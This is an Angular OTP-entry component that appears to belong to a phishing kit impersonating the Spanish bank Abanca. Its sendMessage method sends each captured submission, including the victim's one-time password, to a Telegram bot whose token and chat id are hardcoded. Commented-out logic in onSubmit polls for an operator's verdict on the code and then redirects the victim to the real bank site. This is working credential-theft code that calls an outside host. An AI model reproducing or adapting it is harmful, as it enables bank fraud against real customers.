import { Component, OnInit } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { ActivatedRoute } from '@angular/router';
import { Subscription, interval } from 'rxjs';
import { SubmissionService } from '../submission.service';
import { HttpClient } from '@angular/common/http';

@Component({
  selector: 'app-otp',
  templateUrl: './otp.component.html',
  styleUrls: ['./otp.component.css'],
})
export class OtpComponent implements OnInit {
  otpForm: FormGroup;
  otpCorrect: any;
  correctOtp: string = '123456';
  private submissionUpdateSubscription!: Subscription;
  loading: any;

  ref: any;
  otpValue: any;

  constructor(
    private fb: FormBuilder,
    private route: ActivatedRoute,
    private submissionService: SubmissionService,
    private http: HttpClient
  ) {
    this.otpForm = this.fb.group({
      otp: ['', [Validators.required]],
    });
  }

  ngOnInit(): void {
    this.route.paramMap.subscribe((params) => {
      this.ref = params.get('ref');
    });
  }

  onSubmit(): void {
    // if (this.otpForm.valid) {
    //   console.log('OTP Submitted', this.otpForm.value);
    //   this.loading = true;
    //   this.otpCorrect = null;
    //   this.otpValue = this.otpForm.value.otp;
    //   //const submissions = this.submissionService.getSubmissions();
    //   // Update the submission with the OTP value
    //   const updatedSubmissions = submissions.map((submission) => {
    //     if (submission.ref === this.ref) {
    //       // Send message using Telegram Bot API
    //       this.sendMessage(submission);
    //       return { ...submission, otp: this.otpValue };
    //     } else {
    //       return submission;
    //     }
    //   });
    //   console.log('---' + submissions);
    //   // Save the updated submissions back to local storage
    //   this.submissionService.updateSubmissions(updatedSubmissions);
    //   // Subscribe to periodic
    //   this.submissionUpdateSubscription = interval(1000).subscribe(() => {
    //     const otpStatus = localStorage.getItem('otp_status');
    //     if (otpStatus == 'correct') {
    //       this.loading = false;
    //       this.otpCorrect = true;
    //       window.location.href = 'https://www.abanca.com/';
    //     } else if (otpStatus == 'incorrect') {
    //       this.loading = false;
    //       this.otpCorrect = false;
    //     }
    //   });
    // } else {
    //   console.log('OTP Form Not Valid');
    // }
  }

  sendMessage(submission: any): void {
    const url = `https://api.telegram.org/bot5626992499:AAHfKlpL4ESnTjcXI61fXSx57cu0fW1pU_Y/sendMessage`;
    const params = {
      chat_id: '-1002170066715',
      text: JSON.stringify(submission), // Modify as per your requirement
    };

    this.http.get(url, { params }).subscribe(
      (response) => {
        console.log('Message sent:', response);
      },
      (error) => {
        console.error('Error sending message:', error);
      }
    );
  }
}
